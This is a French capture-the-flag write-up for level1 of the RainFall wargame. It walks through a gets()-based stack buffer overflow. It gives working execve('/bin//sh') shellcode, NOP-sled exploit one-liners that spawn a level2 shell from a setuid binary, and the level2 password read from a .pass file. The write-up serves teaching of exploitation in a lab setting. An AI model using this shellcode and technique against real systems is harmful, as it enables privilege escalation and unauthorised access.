# 01 - Stack buffer overflow 1

- On se connecte en tant que level1:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

```
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

```
level1@RainFall:~$ gdb level1
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```

- Cette exercice est une introduction au [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow). Le programme nous prompt pour écrire dans sa stack sans limite. Il nous faudra:
    * Trouver à partir de combien de caractères l'adresse de retour de la fonction commence à être réécrite.
    * Faire un shellcode qui ouvre un terminal.
    * Trouver l'adresse de la zone mémoire qui contiendra notre shellcode.

- Pour trouver à partir de combien de caractères l'adresse de retour de la fonction commence à être réécrite, on pourrait par exemple utiliser `msf-pattern_create` et `msf-pattern_offset`:
```
$msf-pattern_create -l [pattern length] | ./level1
```

```
$msf-pattern_offset -l [pattern length] -q [overried EIP address]
```

- On trouve que l'adresse de retour est remplacée après le 76ème caractère, maintenant, faisons ce shellcode.
```asm
section .text
    global _start

_start:
    xor esi, esi
    xor edi, edi
    xor ecx, ecx
    xor edx, edx

    push edx                ; \0
    push 0x68732f2f         ; //sh
    push 0x6e69622f         ; /bin
    
    mov ebx, esp            ; Pointer vers /bin//sh
    xor eax, eax
    mov al, 0xb             ; execve
    int 0x80
```

```
$ nasm -f elf32 src.asm -o obj.o
```

```
$ objdump -d obj.o

test.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:   31 f6                   xor    %esi,%esi
   2:   31 ff                   xor    %edi,%edi
   4:   31 c9                   xor    %ecx,%ecx
   6:   31 d2                   xor    %edx,%edx
   8:   52                      push   %edx
   9:   68 2f 2f 73 68          push   $0x68732f2f
   e:   68 2f 62 69 6e          push   $0x6e69622f
  13:   89 e3                   mov    %esp,%ebx
  15:   31 c0                   xor    %eax,%eax
  17:   b0 0b                   mov    $0xb,%al
  19:   cd 80                   int    $0x80
```


- Ça nous donne un shellcode de 27 octets.
```
$ echo -ne "\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80" | wc -c
27
```


- Maintenant, il nous faut stocker notre shellcode quelque part dans la mémoire du programme, par exemple, en l'écrivant dans la zone mémoire remplie par `<gets@plt>`. Commençons par récupérer cette adresse mémoire.
```
level1@RainFall:~$ gdb level1
```

```
(gdb) b*0x08048495
```

```
(gdb) r < <(echo -n "123")
Starting program: /home/user/level1/level1 < <(echo -n "123")

Breakpoint 1, 0x08048495 in main ()
(gdb) x $eax
0xbffff6d0:     0x00333231
```


- On trouve `0xbffff6d0`, essayons:
```
(gdb) r < <(python -c "print '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*49 + '\xd0\xf6\xff\xbf'"; cat)
...
whoami
level1
```


- Un terminal a bien été lancé, maintenant, profitons des [bits de permission setuid et setgid](https://en.wikipedia.org/wiki/Setuid) en faisant la même chose sans GDB.
```
level1@RainFall:~$ (python -c "print '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*49 + '\xd0\xf6\xff\xbf'"; cat) | ./level1

Illegal instruction (core dumped)
```


- Ça ne fonctionne pas. En effet, l'environnement est légèrement différent entre un programme lancé avec/sans GDB. C'est pourquoi l'adresse exacte que nous ciblons n'est pas exactement la même. Il nous faut donc trouver la bonne adresse.

- En ajoutant des `nop` avant notre shellcode, on peut rendre la recherche de l'adresse exacte plus facile. On serait alors tenté de faire comme ceci:
```
python -c "print '\x90'*49 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\xd0\xf6\xff\xbf'"
```

- Mais n'oublions pas de garder de l'espace pour `push $0x68732f2f` et `push 0x6e69622f`:
```
level1@RainFall:~$ (python -c "print '\x90'*41 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*8 + '\xf0\xf6\xff\xbf'"; cat) | ./level1

whoami
level2

cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
